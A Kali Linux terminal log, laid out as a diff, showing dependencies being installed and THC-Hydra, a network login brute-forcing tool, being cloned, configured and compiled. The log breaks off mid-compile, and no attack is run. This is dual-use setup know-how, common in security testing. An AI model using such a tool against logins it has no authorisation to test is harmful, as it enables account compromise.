@@ -1,0 +1,818 @@
+                                                                                                                                                               
+┌──(kali㉿kali)-[~]
+└─$ sudo apt update
+sudo apt install -y build-essential pkg-config git \
+  libssl-dev libssh-dev libidn2-0-dev libpcre3-dev zlib1g-dev
+
+[sudo] password for kali: 
+Hit:1 https://dl.google.com/linux/chrome/deb stable InRelease                                 
+Hit:2 http://http.kali.org/kali kali-rolling InRelease                                        
+All packages are up to date.    
+Note, selecting 'libidn2-dev' instead of 'libidn2-0-dev'
+build-essential is already the newest version (12.12).
+pkg-config is already the newest version (1.8.1-4).
+git is already the newest version (1:2.51.0-1).
+libssl-dev is already the newest version (3.5.3-1).
+libssh-dev is already the newest version (0.11.3-1).
+libidn2-dev is already the newest version (2.3.8-4).
+libidn2-dev set to manually installed.
+zlib1g-dev is already the newest version (1:1.3.dfsg+really1.3.1-1+b1).
+The following packages were automatically installed and are no longer required:
+  amass-common              libjs-jquery-ui     libportmidi0    python3-click-plugins                 python3-kismetcapturertl433   python3-zombie-imp
+  firmware-ti-connectivity  libmongoc-1.0-0t64  libudfread0     python3-gpg                           python3-kismetcapturertladsb  samba-ad-dc
+  libbluray2                libmongocrypt0      libyelp0        python3-kismetcapturebtgeiger         python3-kismetcapturertlamr   samba-ad-provision
+  libbson-1.0-0t64          libplacebo349       python3-bluepy  python3-kismetcapturefreaklabszigbee  python3-protobuf              samba-dsdb-modules
+Use 'sudo apt autoremove' to remove them.
+
+Installing:
+  libpcre3-dev
+                                                                                                                                                                 
+Installing dependencies:
+  libpcre16-3  libpcre32-3  libpcrecpp0v5
+                                                                                                                                                                 
+Summary:
+  Upgrading: 0, Installing: 4, Removing: 0, Not Upgrading: 0
+  Download size: 1,329 kB
+  Space needed: 3,641 kB / 47.1 GB available
+
+Get:1 http://kali.download/kali kali-rolling/main amd64 libpcre16-3 amd64 2:8.39-15.1 [263 kB] 
+Get:2 http://kali.download/kali kali-rolling/main amd64 libpcre32-3 amd64 2:8.39-15.1 [251 kB]
+Get:3 http://kali.download/kali kali-rolling/main amd64 libpcrecpp0v5 amd64 2:8.39-15.1 [143 kB]
+Get:4 http://kali.download/kali kali-rolling/main amd64 libpcre3-dev amd64 2:8.39-15.1 [671 kB]
+Fetched 1,329 kB in 1s (943 kB/s)     
+Selecting previously unselected package libpcre16-3:amd64.
+(Reading database ... 445724 files and directories currently installed.)
+Preparing to unpack .../libpcre16-3_2%3a8.39-15.1_amd64.deb ...
+Unpacking libpcre16-3:amd64 (2:8.39-15.1) ...
+Selecting previously unselected package libpcre32-3:amd64.
+Preparing to unpack .../libpcre32-3_2%3a8.39-15.1_amd64.deb ...
+Unpacking libpcre32-3:amd64 (2:8.39-15.1) ...
+Selecting previously unselected package libpcrecpp0v5:amd64.
+Preparing to unpack .../libpcrecpp0v5_2%3a8.39-15.1_amd64.deb ...
+Unpacking libpcrecpp0v5:amd64 (2:8.39-15.1) ...
+Selecting previously unselected package libpcre3-dev:amd64.
+Preparing to unpack .../libpcre3-dev_2%3a8.39-15.1_amd64.deb ...
+Unpacking libpcre3-dev:amd64 (2:8.39-15.1) ...
+Setting up libpcrecpp0v5:amd64 (2:8.39-15.1) ...
+Setting up libpcre16-3:amd64 (2:8.39-15.1) ...
+Setting up libpcre32-3:amd64 (2:8.39-15.1) ...
+Setting up libpcre3-dev:amd64 (2:8.39-15.1) ...
+Processing triggers for man-db (2.13.1-1) ...
+Processing triggers for kali-menu (2025.4.2) ...
+Processing triggers for libc-bin (2.41-12) ...
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~]
+└─$ git clone https://github.com/vanhauser-thc/thc-hydra.git
+cd thc-hydra
+Cloning into 'thc-hydra'...
+remote: Enumerating objects: 3808, done.
+remote: Counting objects: 100% (1434/1434), done.
+remote: Compressing objects: 100% (210/210), done.
+remote: Total 3808 (delta 1310), reused 1227 (delta 1224), pack-reused 2374 (from 3)
+Receiving objects: 100% (3808/3808), 3.45 MiB | 5.02 MiB/s, done.
+Resolving deltas: 100% (2559/2559), done.
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ ./configure --with-ssl --with-libssh
+
+Starting hydra auto configuration ...
+Detected 64 Bit Linux OS
+
+Checking for zlib (libz/zlib.h) ...
+                                ... found
+Checking for sybdb (sybdb.h) ...
+                                ... sybdb not found, MSSQL module will lack TDSv7 support
+Checking for sybfront (sybfront.h) ...
+                                ... sybfront not found, MSSQL module will lack TDSv7 support
+Checking for openssl (libssl/libcrypto/ssl.h/sha.h) ...
+                                                    ... found
+Checking for gcrypt (libgcrypt/gpg-error.h) ...
+                                            ... gcrypt not found, radmin2 module disabled
+Checking for idn (libidn) ...
+                          ... NOT found, unicode logins and passwords will not be supported
+Checking for curses (libcurses/term.h) ...
+                                       ... found, color output enabled
+Checking for pcre2 (libpcre/pcre.h) ...
+                                    ... NOT found, server response checks will be less reliable
+Checking for Postgres (libpq/libpq-fe.h) ...
+                                         ... NOT found, module postgres disabled
+Checking for SVN (libsvn_client-1/libapr-1/libaprutil-1) ...
+                                                         ... NOT found, module svn disabled
+Checking for firebird (libfbclient) ...
+                                    ... NOT found, module firebird disabled
+Checking for MYSQL client (libmysqlclient/math.h) ...
+                                                  ... NOT found, module Mysql will not support version > 4.x
+Checking for AFP (libafpclient) ...
+                                ... NOT found, module Apple Filing Protocol disabled - Apple sucks anyway
+Checking for NCP (libncp/nwcalls.h) ...
+                                    ... NOT found, module NCP disabled
+Checking for SAP/R3 (librfc/saprfc.h) ...
+                                      ... NOT found, module sapr3 disabled
+Get it from http://www.sap.com/solutions/netweaver/linux/eval/index.asp
+Checking for libssh (libssh/libssh.h) ...
+                                      ... found
+Checking for Oracle (libocci/libclntsh/oci.h/libaio/liboci) ...
+                                                            ... NOT found, module Oracle disabled
+Get basic and sdk package from https://www.oracle.com/database/technologies/instant-client/downloads.html
+Checking for Memcached (libmemcached/memcached.h) ...
+                                                  ... NOT found, module memcached disabled
+Checking for Freerdp3 (libfreerdp3/freerdp.h/libwinpr3/winpr.h) ...
+                                                                ... NOT found, checking for freerdp2 module next...
+Checking for Freerdp2 (libfreerdp2/freerdp.h/libwinpr2/winpr.h) ...
+                                                                ... NOT found, module rdp disabled
+Checking for Mongodb (libmongoc-1.0/mongoc.h/libbson-1.0/bson.h) ...
+                                                                 ... NOT found, module mongodb disabled
+Checking for smbclient (libsmbclient/libsmbclient.h) ...
+                                                     ... NOT found, module smb2 disabled
+Checking for GUI req's (pkg-config/gtk+-2.0) ...
+                                             ... NOT found, optional anyway
+Checking for Android specialities ...
+                                  ... strrchr() found
+                                  ... RSA_generate_key() found
+Checking for secure compile option support in gcc ...
+                                                  Compiling... yes
+                                                  Linking... yes
+Checking for --allow-multiple-definition linker option ... yes
+
+Hydra will be installed into .../bin of: /usr/local
+  (change this by running ./configure --prefix=path)
+
+Writing Makefile.in ...
+now type "make"
+                                                                                                                                                                 
+┌──(kali㉿kali)-[~/thc-hydra]
+└─$ make -j"$(nproc)"
+sudo make install
+sudo ldconfig
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument  -o pw-inspector  pw-inspector.c
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-vnc.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-pcnfs.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-rexec.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-nntp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-socks5.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-telnet.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-cisco.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-http.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-ftp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-imap.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-pop3.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-smb.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-icq.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-cisco-enable.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-ldap.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-memcached.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-mongodb.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-mysql.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-mssql.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-cobaltstrike.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-xmpp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-http-proxy-urlenum.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-snmp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-cvs.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-smtp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-smtp-enum.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-sapr3.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-ssh.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-sshkey.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-teamspeak.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-postgres.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-rsh.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-rlogin.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-oracle-listener.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-svn.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-pcanywhere.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-sip.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-oracle-sid.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-oracle.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-vmauthd.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-asterisk.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-firebird.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-afp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-ncp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-http-proxy.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-http-form.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-irc.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-redis.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
+cc -I. -O3 -g -fcommon -Wno-deprecated-declarations -pie -fPIE -fstack-protector-all --param ssp-buffer-size=4 -D_FORTIFY_SOURCE=2 -Wl,-z,now -Wl,-z,relro -Wl,--allow-multiple-definition -g -D_GNU_SOURCE -Wno-deprecated-declarations -Wno-unused-command-line-argument -c hydra-rdp.c -DLIBOPENSSL -DLIBNCURSES -DLIBSSH -DHAVE_ZLIB -DHAVE_MATH_H  -I/usr/include
